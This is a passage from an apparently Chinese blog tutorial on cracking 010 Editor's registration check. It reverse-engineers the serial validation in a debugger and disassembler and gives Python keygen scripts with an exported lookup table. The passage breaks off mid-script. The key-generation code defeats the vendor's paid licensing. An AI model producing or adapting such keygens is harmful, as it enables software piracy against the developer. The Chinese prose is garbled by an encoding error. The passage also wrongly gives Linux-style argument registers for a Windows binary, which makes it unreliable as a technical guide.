src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/31.png"></p><p>è¯¥å‡½æ•°å°±æ˜¯å¯¹k[1]ã€k[2]ã€k[5]ã€k[7]çš„å€¼è¿›è¡Œä¸€ä¸ªè®¡ç®—ï¼Œç„¶åè®¡ç®—ä½™æ•°ï¼Œå½“ä½™æ•°ä¸º0æ—¶è¿”å›å•†ï¼Œä½™æ•°ä¸ä¸º0æ—¶è¿”å›0</p><p>çœ‹ç½‘ä¸Šçš„æ–‡ç« è¯´åˆ°è¿™é‡Œå¯ä»¥å»ºä¸€ä¸ªæ³¨å†Œæœºæ¨¡å‹ï¼Œä½†è¿˜éœ€è¦ç»§ç»­å¾€ä¸‹åˆ†æï¼Œå› ä¸ºæœ‰ä¸¤å¤„å…³é”®ç‚¹éœ€è¦è¿›è¡Œåˆ†æ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/32.png"></p><p>ç¬¬ä¸€ä¸ªå…³é”®ç‚¹æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªè·³è½¬ï¼Œè·³è½¬å‰é¢æ˜¯<code>test ebx,ebx</code>åˆ¤æ–­ebxçš„å€¼æ˜¯å¦ä¸º0ï¼Œä¸º0åˆ™è·³è½¬ã€‚è€Œebxçš„å€¼æ˜¯ç¬¬ä¸€ä¸ªcallè®¡ç®—å‡ºæ¥çš„ï¼Œæ‰€ä»¥æ­¤å¤„è¿˜ä»¥åˆ¤æ–­ç¬¬ä¸€ä¸ªcalléœ€è¦è¿”å›ä¸€ä¸ªå¤§äº0çš„å€¼ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/33.png"></p><p>ç¬¬äºŒå¤„å…³é”®ä½ç½®æ˜¯ä¸Šå›¾ä¸­çš„<code>cmp eax 0x3E7</code>ï¼Œæ­¤å¤„éœ€è¦æ»¡è¶³eaxå¤§äº0x3E7æ‰èƒ½ä¿è¯ä¸è·³è½¬ï¼Œè€Œeaxåˆæ˜¯ç¬¬äºŒä¸ªcallè¿”å›çš„ã€‚åˆ°è¿™é‡Œåå¯ä»¥æ„å»ºä¸€ä¸ªç®€å•æ³¨å†Œæœºæ¨¡å‹ç”¨äºæ»¡è¶³jeå’Œjaè¿™ä¸¤å¤„å…³é”®çš„è·³è½¬ï¼Œè¯¥æ¨¡å‹åªæ˜¯é€šè¿‡ç©·ä¸¾çš„æ€è·¯æ¥æ»¡è¶³è·³è½¬(å‚è€ƒå¤§ä½¬çš„ï¼Œè¦æ˜¯æˆ‘è‚¯å®šæ˜¯ä»0x00è·‘åˆ°0xff)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-comment"># ä½¿ç”¨éšæœºæ•°æ¥äº§å‡ºç¬¦åˆè¦æ±‚çš„æ³¨å†Œç </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    k = [<span class="hljs-number">0x01</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0xcd</span>] <span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªé•¿åº¦ä¸º8çš„æ•°ç»„ï¼Œk[3]=0x9c</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k0 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k6 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        al = (k0 ^ k6 ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">0x3D</span>) ^ <span class="hljs-number">0xA7</span><br>        <span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># æ ¹æ®jeè·³è½¬</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k1 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k7 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k2 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k5 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br><br>        esi = (<span class="hljs-number">0x100</span> * (k1 ^ k7 &amp; <span class="hljs-number">0xFF</span>) + k2 ^ k5 &amp; <span class="hljs-number">0xFF</span>) &amp; <span class="hljs-number">0xFFFF</span><br>        eax = (((esi ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span>(eax % <span class="hljs-number">0xb</span> ==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> eax/<span class="hljs-number">0xb</span> &lt;=<span class="hljs-number">0x3e8</span>):      <span class="hljs-comment"># æ ¹æ®jaè·³è½¬</span><br>            k[<span class="hljs-number">1</span>] = k1<br>            k[<span class="hljs-number">7</span>] = k7<br>            k[<span class="hljs-number">2</span>] = k2<br>            k[<span class="hljs-number">5</span>] = k5<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%x%x-%x%x-%x%x-%x%x&quot;</span>%(k[<span class="hljs-number">0</span>],k[<span class="hljs-number">1</span>],k[<span class="hljs-number">2</span>],k[<span class="hljs-number">3</span>],k[<span class="hljs-number">4</span>],k[<span class="hljs-number">5</span>],k[<span class="hljs-number">6</span>],k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span>(__name__ == <span class="hljs-string">&quot;__main__&quot;</span>):<br>    main()<br></code></pre></td></tr></table></figure><p>ç»§ç»­å¾€ä¸‹åˆ†æï¼Œå°†ç¨‹åºè¿è¡Œåˆ°<code>cmp eax 0x3E7</code>ä½ç½®ï¼Œä¿®æ”¹eaxçš„å€¼ï¼Œä¿è¯ä¸‹é¢çš„jaä¸è·³è½¬ï¼Œç„¶åä¸€ç›´å¾€ä¸‹èµ°ï¼Œèµ°åˆ°å¦‚ä¸‹å›¾ä½ç½®ï¼Œè¯»å–ç”¨æˆ·åï¼Œå› ä¸ºåœ¨ä¸Šé¢å¯¹æ³¨å†Œç è®¡ç®—æ—¶ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·åè¿›è¡Œä»»ä½•æ“ä½œï¼Œæ‰€ä»¥æ¥ä¸‹æ¥åº”è¯¥æ˜¯å¯¹ç”¨æˆ·åè¿›è¡Œä¸€ä¸ªæ“ä½œäº†ã€‚åŒæ—¶è¦æ³¨æ„æ¥ä¸‹æ¥çš„callï¼Œä¸‹é¢çš„å¯èƒ½æ˜¯å¯¹ç”¨æˆ·åè¿›è¡Œä¸€ä¸ªæ“ä½œã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/34.png"></p><p>è·Ÿè¿›ï¼Œæ­¥å…¥å‡½æ•°ï¼ŒåŒæ—¶ä½¿ç”¨IDAæŸ¥çœ‹è¯¥å‡½æ•°ï¼Œå‘ç°è¯¥å‡½æ•°å…±æ¥æ”¶4ä¸ªå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥å›çœ‹ä¸€ä¸‹ä¸Šé¢çš„åœ¨è¿›å…¥<code>call 010editor.13FF97FD6</code>ä¹‹å‰ï¼Œå…ˆåå‘rcx,rd9,rd8,edxä¸­ä¼ å…¥å‚æ•°ã€‚</p><p>å·²çŸ¥åœ¨64ä½æ±‡ç¼–ä¸­ï¼Œå½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9ï¼Œæ‰€ä»¥è¿™é‡Œå‘è¿™å››ä¸ªå¯„å­˜å™¨ä¼ å…¥çš„å€¼ï¼Œå°±æ˜¯ä¼ è¿›çš„å‚æ•°ï¼Œä½†æ˜¯è¿™é‡ŒIDAåç¼–è¯‘å‡ºæ¥çš„ç»“æœï¼Œé¡ºåºå¥½åƒæœ‰ç‚¹å¯¹ä¸ä¸Š</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/35.png"></p><p>ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå¯ä»¥å¯¹ç…§xdbgï¼Œåˆ¤æ–­å‡ºa1,a2,a3,a4çš„å€¼</p><p>è¿™é‡Œå…ˆçœ‹ä¸€ä¸‹ä¼ å…¥å„ä¸ªå¯„å­˜å™¨çš„å€¼</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/36.png"></p><p>è¿›è¿‡å¯¹æ¯”åˆ†æåå¾—å‡º</p><blockquote><p>a1=ç”¨æˆ·å</p><p>a2=1</p><p>a3=0</p><p>a4=å•†ï¼Œä¹Ÿå°±æ˜¯å‰é¢ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼</p></blockquote><p>ç»§ç»­å¾€ä¸‹åˆ†æï¼Œè¯¥å‡½æ•°å…ˆæ˜¯è®¡ç®—äº†ä¸€ä¸‹ç”¨æˆ·åçš„é•¿åº¦ï¼Œè‹¥ç”¨æˆ·åé•¿åº¦ä¸ä¸º0åˆ™å¯¹ä¸€äº›å˜é‡è¿›è¡Œèµ‹å€¼æ“ä½œ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/37.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/38.png"></p><p>è¿™é‡Œï¼Œå°±æ˜¯æ ¹æ®ç”¨æˆ·åã€å†é…åˆä¸Šdword_1420750E0è¿™ä¸ªæ•°æ®è¿›è¡Œä¸€ä¸ªè®¡ç®—ï¼Œå°†å€¼ä¿å­˜åˆ°v4ä¸­ï¼Œç„¶åè¿”å›ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹dword_1420750E0è¿™ä¸ªæ•°ç»„ï¼Œæ²¡å•¥çœ‹çš„ï¼Œä¸€å †æ•°å­—</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/39.png"></p><p>è¿™é‡Œéœ€è¦åšçš„æ˜¯å¯¼å‡ºè¿™æ®µæ•°æ®ï¼Œå› ä¸ºæ¥ä¸‹æ¥è®¡ç®—æ³¨å†Œç æ—¶ä¸€å®šèƒ½å¤Ÿä½¿ç”¨åˆ°ã€‚è¿™é‡Œçœ‹ç½‘ä¸Šçš„æ˜¯ç”¨ODæ’ä»¶å¯¼å‡ºï¼Œå¯¼å‡ºçš„æ•°æ®å¾ˆå®Œç¾ï¼Œå¥ˆä½•æˆ‘çš„ODç”¨ä¸äº†ï¼ŒæŒ‚è½½ä¸äº†010Editorçš„ç¨‹åºï¼Œæ‰€ä»¥åªèƒ½è¢«è¿«ä½¿ç”¨IDA,å¯¼å‡ºæ•°æ®ï¼Œå¯¼å‡ºçš„æ•°æ®æ˜¯10è¿›åˆ¶çš„ï¼Œç„¶åè¿˜æœ‰ç‚¹ä¸å®Œç¾ï¼Œä¸è¿‡ä¸å½±å“ï¼Œç¨å¾®æ›´æ”¹ä¸€ä¸‹å°±å¯ä»¥ç”¨äº†ï¼Œé€‰ä¸­è¯¥æ•°æ®ï¼Œshift+eï¼Œå¯¼å‡ºæ•°æ®å³å¯</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/40.png"></p><p>ç»§ç»­å¾€ä¸‹èµ°ï¼Œè¯¥å‡½æ•°æ ¹æ®ç”¨æˆ·åå’Œå•†è®¡ç®—å‡ºä¸€ä¸ªå€¼ï¼Œç„¶åä¸è¾“å…¥çš„æ³¨å†Œç çš„k[4]ã€k[5]ã€k[6]ã€k[7]æ¯”è¾ƒï¼Œåé¢å°†k[0]å’Œçœ‹k[6]çš„è®¡ç®—ç»“æœä¸0xAè¿›è¡Œäº†ä¸€ä¸ªæ¯”è¾ƒ<code>cmp eax,dword ptr ds:[rdi+2C]</code></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/41.png"></p><p>æ‰€ä»¥å°±éœ€è¦ä¿®æ”¹åˆšåˆšçš„æ³¨å†Œæœºæ¨¡å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># æ ¹æ®jeè·³è½¬</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <br><span class="hljs-comment"># æ›´æ”¹ä¸º</span><br><span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0xA</span>):           <span class="hljs-comment"># æ ¹æ®jbeè·³è½¬</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå¯ä»¥å¯¹æ³¨å†Œæœºç¼–å†™ï¼Œå…ˆæ‹ä¸€ä¸‹æ€è·¯ï¼Œè¦æ˜¯æ€è·¯è¿˜ä¸æ¸…æ™°ï¼Œå¯ä»¥å†å¤šèµ°å‡ éç¨‹åº</p><blockquote><p>ç¨‹åºå…ˆå¯¹k[0]å’Œk[6]è¿›è¡Œä¸€ä¸ªè®¡ç®—å¤„ç†</p><p>å†å¯¹k[1]ã€k[2]ã€k[5]ã€k[7]è®¡ç®—å¾—å‡ºä¸€ä¸ªå•†</p><p>ç„¶åæ ¹æ®å•†ã€ç”¨æˆ·åã€å’Œå†…å­˜ä¸­çš„ä¸€ä¸ªæ•°ç»„è®¡ç®—å‡ºk[4]ã€k[5]ã€k[6]ã€k[7]çš„å€¼</p><p>è®¡ç®—å‡ºçš„å€¼ï¼Œå†ä¸è¾“å…¥çš„æ³¨å†Œç è¿›è¡Œæ¯”è¾ƒï¼Œæ¯”è¾ƒæˆåŠŸåˆ™æˆåŠŸ</p></blockquote><p>æ³¨å†Œæœºç¼–å†™æ€è·¯ï¼š</p><blockquote><p>å…ˆéšæœºå–ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„å•†</p><p>æ ¹æ®å•†ä¸ç”¨æˆ·åè®¡ç®—å‡ºæ³¨å†Œç çš„åå››ä½</p><p>å†æ ¹æ®å•†åæ¨å‡ºk[1]å’Œk[2]</p><p>æœ€åå†æ ¹æ®k[6]å–ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„k[0]</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>tables = [<span class="hljs-number">0x39cb44b8</span>, <span class="hljs-number">0x23754f67</span>, <span class="hljs-number">0x5f017211</span>, <span class="hljs-number">0x3ebb24da</span>, <span class="hljs-number">0x351707c6</span>, <span class="hljs-number">0x63f9774b</span>, <span class="hljs-number">0x17827288</span>, <span class="hljs-number">0x0fe74821</span>,<br>         <span class="hljs-number">0x5b5f670f</span>, <span class="hljs-number">0x48315ae8</span>, <span class="hljs-number">0x785b7769</span>, <span class="hljs-number">0x2b7a1547</span>, <span class="hljs-number">0x38d11292</span>, <span class="hljs-number">0x42a11b32</span>, <span class="hljs-number">0x35332244</span>, <span class="hljs-number">0x77437b60</span>,<br>         <span class="hljs-number">0x1eab3b10</span>, <span class="hljs-number">0x53810000</span>, <span class="hljs-number">0x1d0212ae</span>, <span class="hljs-number">0x6f0377a8</span>, <span class="hljs-number">0x43c03092</span>, <span class="hljs-number">0x2d3c0a8e</span>, <span class="hljs-number">0x62950cbf</span>, <span class="hljs-number">0x30f06ffa</span>,<br>         <span class="hljs-number">0x34f710e0</span>, <span class="hljs-number">0x28f417fb</span>, <span class="hljs-number">0x350d2f95</span>, <span class="hljs-number">0x5a361d5a</span>, <span class="hljs-number">0x15cc060b</span>, <span class="hljs-number">0x0afd13cc</span>, <span class="hljs-number">0x28603bcf</span>, <span class="hljs-number">0x3371066b</span>,<br>         <span class="hljs-number">0x30cd14e4</span>, <span class="hljs-number">0x175d3a67</span>, <span class="hljs-number">0x6dd66a13</span>, <span class="hljs-number">0x2d3409f9</span>, <span class="hljs-number">0x581e7b82</span>, <span class="hljs-number">0x76526b99</span>, <span class="hljs-number">0x5c8d5188</span>, <span class="hljs-number">0x2c857971</span>,<br>         <span class="hljs-number">0x15f51fc0</span>, <span class="hljs-number">0x68cc0d11</span>, <span class="hljs-number">0x49f55e5c</span>, <span class="hljs-number">0x275e4364</span>, <span class="hljs-number">0x2d1e0dbc</span>, <span class="hljs-number">0x4cee7ce3</span>, <span class="hljs-number">0x32555840</span>, <span class="hljs-number">0x112e2e08</span>,<br>         <span class="hljs-number">0x6978065a</span>, <span class="hljs-number">0x72921406</span>, <span class="hljs-number">0x314578e7</span>, <span class="hljs-number">0x175621b7</span>, <span class="hljs-number">0x40771dbf</span>, <span class="hljs-number">0x3fc238d6</span>, <span class="hljs-number">0x4a31128a</span>, <span class="hljs-number">0x2dad036e</span>,<br>         <span class="hljs-number">0x41a069d6</span>, <span class="hljs-number">0x25400192</span>, <span class="hljs-number">0x00dd4667</span>, <span class="hljs-number">0x6afc1f4f</span>, <span class="hljs-number">0x571040ce</span>, <span class="hljs-number">0x62fe66df</span>, <span class="hljs-number">0x41db4b3e</span>, <span class="hljs-number">0x3582231f</span>,<br>         <span class="hljs-number">0x55f6079a</span>, <span class="hljs-number">0x1ca70644</span>, <span class="hljs-number">0x1b1643d2</span>, <span class="hljs-number">0x3f7228c9</span>, <span class="hljs-number">0x5f141070</span>, <span class="hljs-number">0x3e1474ab</span>, <span class="hljs-number">0x444b256e</span>, <span class="hljs-number">0x537050d9</span>,<br>         <span class="hljs-number">0x0f42094b</span>, <span class="hljs-number">0x2fd820e6</span>, <span class="hljs-number">0x778b2e5e</span>, <span class="hljs-number">0x71176d02</span>, <span class="hljs-number">0x7fea7a69</span>, <span class="hljs-number">0x5bb54628</span>, <span class="hljs-number">0x19ba6c71</span>, <span class="hljs-number">0x39763a99</span>,<br>         <span class="hljs-number">0x178d54cd</span>, <span class="hljs-number">0x01246e88</span>, <span class="hljs-number">0x3313537e</span>, <span class="hljs-number">0x2b8e2d17</span>, <span class="hljs-number">0x2a3d10be</span>, <span class="hljs-number">0x59d10582</span>, <span class="hljs-number">0x37a163db</span>, <span class="hljs-number">0x30d6489a</span>,<br>         <span class="hljs-number">0x6a215c46</span>, <span class="hljs-number">0x0e1c7a76</span>, <span class="hljs-number">0x1fc760e7</span>, <span class="hljs-number">0x79b80c65</span>, <span class="hljs-number">0x27f459b4</span>, <span class="hljs-number">0x799a7326</span>, <span class="hljs-number">0x50ba1782</span>, <span class="hljs-number">0x2a116d5c</span>,<br>         <span class="hljs-number">0x63866e1b</span>, <span class="hljs-number">0x3f920e3c</span>, <span class="hljs-number">0x55023490</span>, <span class="hljs-number">0x55b56089</span>, <span class="hljs-number">0x2c391fd1</span>, <span class="hljs-number">0x2f8035c2</span>, <span class="hljs-number">0x64fd2b7a</span>, <span class="hljs-number">0x4ce8759a</span>,<br>         <span class="hljs-number">0x518504f0</span>, <span class="hljs-number">0x799501a8</span>, <span class="hljs-number">0x3f5b2cad</span>, <span class="hljs-number">0x38e60160</span>, <span class="hljs-number">0x637641d8</span>, <span class="hljs-number">0x33352a42</span>, <span class="hljs-number">0x51a22c19</span>, <span class="hljs-number">0x085c5851</span>,<br>         <span class="hljs-number">0x032917ab</span>, <span class="hljs-number">0x2b770ac7</span>, <span class="hljs-number">0x30ac77b3</span>, <span class="hljs-number">0x2bec1907</span>, <span class="hljs-number">0x035202d0</span>, <span class="hljs-number">0x0fa933d3</span>, <span class="hljs-number">0x61255df3</span>, <span class="hljs-number">0x22ad06bf</span>,<br>         <span class="hljs-number">0x58b86971</span>, <span class="hljs-number">0x5fca0de5</span>, <span class="hljs-number">0x700d6456</span>, <span class="hljs-number">0x56a973db</span>, <span class="hljs-number">0x5ab759fd</span>, <span class="hljs-number">0x330e0be2</span>, <span class="hljs-number">0x5b3c0ddd</span>, <span class="hljs-number">0x495d3c60</span>,<br>         <span class="hljs-number">0x53bd59a6</span>, <span class="hljs-number">0x4c5e6d91</span>, <span class="hljs-number">0x49d9318d</span>, <span class="hljs-number">0x103d5079</span>, <span class="hljs-number">0x61ce42e3</span>, <span class="hljs-number">0x7ed5121d</span>, <span class="hljs-number">0x14e160ed</span>, <span class="hljs-number">0x212d4ef2</span>,<br>         <span class="hljs-number">0x270133f0</span>, <span class="hljs-number">0x62435a96</span>, <span class="hljs-number">0x1fa75e8b</span>, <span class="hljs-number">0x6f092fbe</span>, <span class="hljs-number">0x4a000d49</span>, <span class="hljs-number">0x57ae1c70</span>, <span class="hljs-number">0x004e2477</span>, <span class="hljs-number">0x561e7e72</span>,<br>         <span class="hljs-number">0x468c0033</span>, <span class="hljs-number">0x5dcc2402</span>, <span class="hljs-number">0x78507ac6</span>, <span class="hljs-number">0x58af24c7</span>, <span class="hljs-number">0x0df62d34</span>, <span class="hljs-number">0x358a4708</span>, <span class="hljs-number">0x3cfb1e11</span>, <span class="hljs-number">0x2b71451c</span>,<br>         <span class="hljs-number">0x77a75295</span>, <span class="hljs-number">0x56890721</span>, <span class="hljs-number">0x0fef75f3</span>, <span class="hljs-number">0x120f24f1</span>, <span class="hljs-number">0x01990ae7</span>, <span class="hljs-number">0x339c4452</span>, <span class="hljs-number">0x27a15b8e</span>, <span class="hljs-number">0x0ba7276d</span>,<br>         <span class="hljs-number">0x60dc1b7b</span>, <span class="hljs-number">0x4f4b7f82</span>, <span class="hljs-number">0x67db7007</span>, <span class="hljs-number">0x4f4a57d9</span>, <span class="hljs-number">0x621252e8</span>, <span class="hljs-number">0x20532cfc</span>, <span class="hljs-number">0x6a390306</span>, <span class="hljs-number">0x18800423</span>,<br>         <span class="hljs-number">0x19f3778a</span>, <span class="hljs-number">0x462316f0</span>, <span class="hljs-number">0x56ae0937</span>, <span class="hljs-number">0x43c2675c</span>, <span class="hljs-number">0x65ca45fd</span>, <span class="hljs-number">0x0d604ff2</span>, <span class="hljs-number">0x0bfd22cb</span>, <span class="hljs-number">0x3afe643b</span>,<br>         <span class="hljs-number">0x3bf67fa6</span>, <span class="hljs-number">0x44623579</span>, <span class="hljs-number">0x184031f8</span>, <span class="hljs-number">0x32174f97</span>, <span class="hljs-number">0x4c6a092a</span>, <span class="hljs-number">0x5fb50261</span>, <span class="hljs-number">0x01650174</span>, <span class="hljs-number">0x33634af1</span>,<br>         <span class="hljs-number">0x712d18f4</span>, <span class="hljs-number">0x6e997169</span>, <span class="hljs-number">0x5dab7afe</span>, <span class="hljs-number">0x7c2b2ee8</span>, <span class="hljs-number">0x6edb75b4</span>, <span class="hljs-number">0x5f836fb6</span>, <span class="hljs-number">0x3c2a6dd6</span>, <span class="hljs-number">0x292d05c2</span>,<br>         <span class="hljs-number">0x052244db</span>, <span class="hljs-number">0x149a5f4f</span>, <span class="hljs-number">0x5d486540</span>, <span class="hljs-number">0x331d15ea</span>, <span class="hljs-number">0x4f456920</span>, <span class="hljs-number">0x483a699f</span>, <span class="hljs-number">0x3b450f05</span>, <span class="hljs-number">0x3b207c6c</span>,<br>         <span class="hljs-number">0x749d70fe</span>, <span class="hljs-number">0x417461f6</span>, <span class="hljs-number">0x62b031f1</span>, <span class="hljs-number">0x2750577b</span>, <span class="hljs-number">0x29131533</span>, <span class="hljs-number">0x588c3808</span>, <span class="hljs-number">0x1aef3456</span>, <span class="hljs-number">0x0f3c00ec</span>,<br>         <span class="hljs-number">0x7da74742</span>, <span class="hljs-number">0x4b797a6c</span>, <span class="hljs-number">0x5ebb3287</span>, <span class="hljs-number">0x786558b8</span>, <span class="hljs-number">0x00ed4ff2</span>, <span class="hljs-number">0x6269691e</span>, <span class="hljs-number">0x24a2255f</span>, <span class="hljs-number">0x62c11f7e</span>,<br>         <span class="hljs-number">0x2f8a7dcd</span>, <span class="hljs-number">0x643b17fe</span>, <span class="hljs-number">0x778318b8</span>, <span class="hljs-number">0x253b60fe</span>, <span class="hljs-number">0x34bb63a3</span>, <span class="hljs-number">0x5b03214f</span>, <span class="hljs-number">0x5f1571f4</span>, <span class="hljs-number">0x1a316e9f</span>,<br>         <span class="hljs-number">0x7acf2704</span>, <span class="hljs-number">0x28896838</span>, <span class="hljs-number">0x18614677</span>, <span class="hljs-number">0x1bf569eb</span>, <span class="hljs-number">0x0ba85ec9</span>, <span class="hljs-number">0x6aca6b46</span>, <span class="hljs-number">0x1e43422a</span>, <span class="hljs-number">0x514d5f0e</span>,<br>         <span class="hljs-number">0x413e018c</span>, <span class="hljs-number">0x307626e9</span>, <span class="hljs-number">0x01ed1dfa</span>, <span class="hljs-number">0x49f46f5a</span>, <span class="hljs-number">0x461b642b</span>, <span class="hljs-number">0x7d7007f2</span>, <span class="hljs-number">0x13652657</span>, <span class="hljs-number">0x6b160bc5</span>,<br>         <span class="hljs-number">0x65e04849</span>, <span class="hljs-number">0x1f526e1c</span>, <span class="hljs-number">0x5a0251b6</span>, <span class="hljs-number">0x2bd73f69</span>, <span class="hljs-number">0x2dbf7acd</span>, <span class="hljs-number">0x51e63e80</span>, <span class="hljs-number">0x5cf2670f</span>, <span class="hljs-number">0x21cd0a03</span>,<br>         <span class="hljs-number">0x5cff0261</span>, <span class="hljs-number">0x33ae061e</span>, <span class="hljs-number">0x3bb6345f</span>, <span class="hljs-number">0x5d814a75</span>, <span class="hljs-number">0x257b5df4</span>, <span class="hljs-number">0x0a5c2c5b</span>, <span class="hljs-number">0x16a45527</span>, <span class="hljs-number">0x16f23945</span><br>         ]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_quo</span>():</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">0x10000</span>)      <span class="hljs-comment"># è¿™ä¸ªiï¼Œå°±æ˜¯(0x100*(k[1]^k[7])+(k[2]^k[5])</span><br>        eax = (((i ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span 